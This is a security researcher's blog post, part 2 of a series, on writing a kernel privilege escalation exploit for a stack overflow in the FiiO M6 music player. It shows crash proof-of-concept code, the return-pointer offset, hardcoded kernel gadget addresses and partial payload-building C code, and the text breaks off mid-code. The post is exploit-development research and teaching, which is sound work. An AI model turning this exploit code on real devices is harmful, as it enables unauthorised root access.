<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug" /><meta name="author" content="Jack Maginnes (stigward)" /><meta property="og:locale" content="en" /><meta name="description" content="Overview:" /><meta property="og:description" content="Overview:" /><link rel="canonical" href="https://stigward.github.io/posts/fiio-m6-exploit/" /><meta property="og:url" content="https://stigward.github.io/posts/fiio-m6-exploit/" /><meta property="og:site_name" content="Stigward’s Security Journal" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-03-27T21:33:00-06:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug" /><meta name="twitter:site" content="@_stigward" /><meta name="twitter:creator" content="@_stigward" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Jack Maginnes (stigward)","url":"https://github.com/stigward/"},"dateModified":"2023-04-20T13:07:22-06:00","datePublished":"2023-03-27T21:33:00-06:00","description":"Overview:","headline":"Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug","mainEntityOfPage":{"@type":"WebPage","@id":"https://stigward.github.io/posts/fiio-m6-exploit/"},"url":"https://stigward.github.io/posts/fiio-m6-exploit/"}</script><title>Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug | Stigward's Security Journal</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/new_favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/new_favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/new_favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/new_favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/new_favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Stigward's Security Journal"><meta name="application-name" content="Stigward's Security Journal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/new_favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/profile.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Stigward's Security Journal</a></div><div class="site-subtitle font-italic">Bug Creator and Exploiter</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/stigward" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/_stigward" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['stigward.research','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1679974380" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 27, 2023 </em> </span> <span> Updated <em class="" data-ts="1682017642" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Apr 20, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/stigward/">Jack Maginnes (stigward)</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3647 words"> <em>20 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview:</h1><p>A little over a month ago, I wrote a <a href="https://stigward.github.io/posts/fiio-m6-kernel-bug/">blog post</a> detailing how I found a kernel vulnerability in the FiiO M6 Hi-Fi MP3 player. I would recommend reading that post first, but to recap:</p><ul><li>The device is Android-based, running a version 3.18 AArch64 Linux kernel<li>The <code class="language-plaintext highlighter-rouge">ftxxxx-debug</code> entry in procfs has a write-handler which suffers from a straight forward stack-overflow. It reads an arbitrary amount of user-controlled data into a fixed size kernel buffer using the <code class="language-plaintext highlighter-rouge">copy_from_user</code> function</ul><p><img data-src="https://soundnews.net/uploads/FiiO%20M6-5-1.jpg" alt="fiio_image" data-proofer-ignore></p><p>Having never done any kernel exploit dev, the thought of turning this bug into a weaponized privilege escalation initially felt out of the picture. However, upon further consideration, I realized this was essentially the “Hello World” of Linux exploitation on a real-world device; if I was gonna find an entry point into the field, this might as well be it. What followed was 30 days filled with reading, learning, and a LOT of waiting for the device to reboot after crashing. The remainder of this post will cover the technical details of the successful exploit, skimming over the extensive trial and error which took place. I may include a part 3 post or video recapping and reflecting on the project and going more in-depth on the learning process.</p><h1 id="tldr">TL;DR:</h1><p>The device does not have any stack canaries, so our overflow allows us to directly overwrite the saved <code class="language-plaintext highlighter-rouge">x30</code> return pointer. While SMAP/SMEP are enabled, the kernel stack is marked as executable and KASLR is disabled. At the time of our overflow, register <code class="language-plaintext highlighter-rouge">x21</code> always holds a pointer to somewhere in the kernel stack, which contains our user-controlled data. We can use the gadget <code class="language-plaintext highlighter-rouge">blr x21</code> to jump to custom shellcode included in the overflow payload. Our shellcode performs a “HotPlugEater” attack, in which <code class="language-plaintext highlighter-rouge">uevent_helper</code> is overwritten to point to an attacker-controlled script, executing the malicious payload with root permissions. While there are numerous more “standard” ways to achieve the same effect once obtaining control over <code class="language-plaintext highlighter-rouge">PC</code>, the inability to do any kernel debugging and the lack of ARM64 Linux kernel exploitation resources presented significant hurdles.</p><h1 id="picking-up-where-we-left-off">Picking Up Where We Left Off:</h1><h2 id="finding-the-offset-to-the-saved-return-pointer"><span class="mr-2">Finding the Offset To The Saved Return Pointer:</span><a href="#finding-the-offset-to-the-saved-return-pointer" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>At the end of the previous post, I released a Crash PoC for the vulnerability. It has been included again below:</p><div class="language-rust highlighter-rouge"><div class="code-header"> <span data-label-text="Rust"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">io</span><span class="p">::{</span><span class="n">Read</span><span class="p">,</span> <span class="n">Write</span><span class="p">,</span> <span class="n">stdin</span><span class="p">,</span> <span class="n">stdout</span><span class="p">};</span>
<span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">fs</span><span class="p">::</span><span class="n">OpenOptions</span><span class="p">;</span>
 
<span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="c1">// create our long payload</span>
    <span class="k">let</span> <span class="k">mut</span> <span class="n">buf</span> <span class="o">=</span> <span class="nd">vec!</span><span class="p">[</span><span class="mi">0x41u8</span><span class="p">;</span> <span class="mi">32</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">];</span>
    <span class="nd">println!</span><span class="p">(</span><span class="s">"{}"</span><span class="p">,</span> <span class="n">buf</span><span class="nf">.len</span><span class="p">());</span>

	<span class="c1">// open /proc/ftxxxx-debug for writing</span>
    <span class="k">let</span> <span class="n">path</span> <span class="o">=</span> <span class="s">"/proc/ftxxxx-debug"</span><span class="p">;</span>
    <span class="k">let</span> <span class="n">fd</span> <span class="o">=</span> <span class="nn">OpenOptions</span><span class="p">::</span><span class="nf">new</span><span class="p">()</span><span class="nf">.write</span><span class="p">(</span><span class="k">true</span><span class="p">)</span><span class="nf">.open</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>

    <span class="nd">print!</span><span class="p">(</span><span class="s">"Writing {:?}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
    <span class="k">if</span> <span class="k">let</span> <span class="nf">Ok</span><span class="p">(</span><span class="k">mut</span> <span class="n">fd</span><span class="p">)</span> <span class="o">=</span> <span class="n">fd</span> <span class="p">{</span>
		<span class="k">let</span> <span class="n">fuzz_size</span> <span class="o">=</span> <span class="n">buf</span><span class="nf">.len</span><span class="p">();</span>
		<span class="k">let</span> <span class="n">_</span> <span class="o">=</span> <span class="n">fd</span><span class="nf">.write</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="o">..</span><span class="n">fuzz_size</span><span class="p">]);</span>    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>For this proof-of-concept code, I chose an arbitrarily long buffer (32 * 1024 bytes) which I knew would cause a crash. However, after confirming there were no stack canaries, the first step for the exploit was to determine the offset to the saved link register (<code class="language-plaintext highlighter-rouge">x30</code>). At the end of each function call in ARM64, this saved value is popped back off the stack into <code class="language-plaintext highlighter-rouge">x30</code>. Upon encountering a <code class="language-plaintext highlighter-rouge">RET</code> instruction, the program loads the value of <code class="language-plaintext highlighter-rouge">x30</code> into the <code class="language-plaintext highlighter-rouge">PC</code>.</p><p>To determine the offset, I manually created random payloads and then checked what the <code class="language-plaintext highlighter-rouge">PC</code> value was in the kernel crash. After a few attempts, I was able to determine that the offset was 1024 bytes. As such, we can update the crash PoC to have the following payload:</p><div class="language-rust highlighter-rouge"><div class="code-header"> <span data-label-text="Rust"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c1">// ... previous code ...</span>
<span class="k">let</span> <span class="k">mut</span> <span class="n">buf</span> <span class="o">=</span> <span class="nd">vec!</span><span class="p">[</span><span class="mi">0x41u8</span><span class="p">,</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">128</span><span class="p">];</span> <span class="c1">// 1024 bytes of junk 0x41s</span>
<span class="k">let</span> <span class="k">mut</span> <span class="n">buf1</span> <span class="o">=</span> <span class="nd">vec!</span><span class="p">[</span><span class="mi">0x42u8</span><span class="p">,</span> <span class="mi">8</span><span class="p">];</span> <span class="c1">// 8 bytes of 0x42, overwriting our saved x30 address</span>
<span class="n">buf</span><span class="nf">.append</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">buf1</span><span class="p">);</span>
<span class="c1">// ... previous code ...</span>
</pre></table></code></div></div><p>Reviewing the kernel panic now, the <code class="language-plaintext highlighter-rouge">PC</code> is filled with our 8 <code class="language-plaintext highlighter-rouge">0x42</code>s, indicating that we have successfully found the offset to the saved <code class="language-plaintext highlighter-rouge">x30</code> value and can redirect program execution.</p><p><img data-src="/assets/img/img_fiio_exploit/kernel_panic_offset.png" alt="kernel_panic_offset" data-proofer-ignore></p><h2 id="obtaining-the-kernel-symbols"><span class="mr-2">Obtaining the Kernel Symbols:</span><a href="#obtaining-the-kernel-symbols" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The next step of the process was to obtain kernel symbols. While our <code class="language-plaintext highlighter-rouge">shell</code> user <em>does</em> have read permissions to <code class="language-plaintext highlighter-rouge">/proc/kallsyms</code>, <code class="language-plaintext highlighter-rouge">kptr_restrict</code> is set to 2 and thus all the addresses are shown as 0.</p><p><img data-src="/assets/img/img_fiio_exploit/kptr_restrict.png" alt="kptr_restrict" data-proofer-ignore></p><p>After a bit of digging, I found a <a href="https://github.com/ycc57b/ksyms_finder">GitHub repo</a> dedicated to extracting symbols from ARM64 Android Kernel images. I was able to obtain the firmware for the FiiO M6 <a href="https://forum.fiio.com/note/showNoteContent.do?id=202105171712474610816&amp;tid=74">directly from their website</a>. Extracting the provided zip file was enough to obtain the kernel image individually. Using it with the script from GitHub, we can dump all the kernel symbols! Since there’s no KASLR, these are static values which we can hardcode into our exploit.</p><p><img data-src="/assets/img/img_fiio_exploit/kallsyms_new.png" alt="ksyms_finder" data-proofer-ignore></p><h2 id="kernel-debugging"><span class="mr-2">Kernel Debugging?</span><a href="#kernel-debugging" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Since this was my first kernel exploit ever, I was really hoping to get some form of a debug set-up working. I assumed the contents inside the FiiO firmware package would be enough to get an emulated kernel up and running. However, after a week of attempting, I had made no progress. I am still fairly confident it can be done, but I couldn’t figure it out and didn’t want to spend any more time on it. I switched gears a bit and tried to patch the bootloader to root the device, but this also proved unsuccessful. I decided to proceed with no debugging capabilities, and return only if I couldn’t figure out how to craft an exploit without them.</p><h1 id="exploitation">Exploitation:</h1><h2 id="initial-strategy"><span class="mr-2">Initial Strategy:</span><a href="#initial-strategy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now that we have kernel symbols and the ability to redirect program execution, it’s time to come up with an exploit strategy. After a few days of learning about Linux privesc exploit techniques, I decided that using the classic <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(NULL))</code> path would probably be best. You can learn more about this privesc strategy <a href="https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html">here</a> but the quick summary is:</p><ul><li><code class="language-plaintext highlighter-rouge">prepare_kernel_cred</code> creates a root-privileged cred when called with a NULL argument<li><code class="language-plaintext highlighter-rouge">commit_creds</code> takes a pointer to a cred structure, and sets the current process to have that privilege level</ul><p>Therefore, <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(NULL))</code> sets the process’s privilege level to root. After that, we just return execution out of kernel mode and back to our userland process.</p><h2 id="surely-the-stack-isnt-executable-right"><span class="mr-2">Surely The Stack Isn’t Executable, Right…?</span><a href="#surely-the-stack-isnt-executable-right" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>With our exploit strategy in mind, I set out to write a ROP chain. There are almost no publicly available resources on ARM64 kernel ROP, but I was able to find some useful posts about userland exploitation, such as a <a href="https://blog.perfect.blue/ROPing-on-Aarch64">post</a> from Perfect Blue and a <a href="https://www.youtube.com/watch?v=9Mq6NTLGHtM&amp;t=1606s">talk</a> from Billy Ellis.</p><p>As the architecture expands in popularity, maybe one day we will see more write-ups on the subject. Today, however, is <em>not</em> that day. About midway through struggling to craft and debug a proper ROP chain, I spotted something interesting. The <code class="language-plaintext highlighter-rouge">x21</code> register pointed to an area on the stack which we could overflow with anything we wrote after overwriting the saved <code class="language-plaintext highlighter-rouge">x30</code> value. For example, we can use the following code:</p><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="kt">uint64_t</span> <span class="n">fake_ret_addr</span> <span class="o">=</span> <span class="mh">0x4242424242424242ULL</span><span class="p">;</span>  
<span class="kt">uint64_t</span> <span class="n">x21_overflow</span> <span class="o">=</span> <span class="mh">0x4343434343434343ULL</span><span class="p">;</span>  
  
<span class="k">static</span> <span class="kt">int</span> <span class="nf">exploit</span><span class="p">()</span> <span class="p">{</span>  
  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>  
  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/ftxxxx-debug"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>  
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>  
  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>  
  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mi">1023</span><span class="p">);</span>  

  <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">chain</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">fake_ret_addr</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  

  <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>  
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>  
<span class="p">}</span>
</pre></table></code></div></div><p>And now reviewing the crash logs, we can see that <code class="language-plaintext highlighter-rouge">x21</code> holds our <code class="language-plaintext highlighter-rouge">0x43</code>s</p><p><img data-src="/assets/img/img_fiio_exploit/x21_overflowed.png" alt="x21_overflow" data-proofer-ignore></p><p>I had been under the assumption that the stack was not executable, but I decided there was no harm putting this belief to the test. I used <code class="language-plaintext highlighter-rouge">ropper</code> to find a <code class="language-plaintext highlighter-rouge">blr x21</code> gadget and overwrote the saved <code class="language-plaintext highlighter-rouge">x30</code> with it. This would redirect code execution to the pointer stored in <code class="language-plaintext highlighter-rouge">x21</code>.</p><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="kt">uint64_t</span> <span class="n">kernel_base</span> <span class="o">=</span> <span class="mh">0xFFFFFFC000080000ULL</span><span class="p">;</span>  
<span class="kt">uint64_t</span> <span class="n">blr_x21</span> <span class="o">=</span> <span class="mh">0x000000000001e664ULL</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>

<span class="c1">// ... previous code ...</span>
  <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">chain</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">blr_x21</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
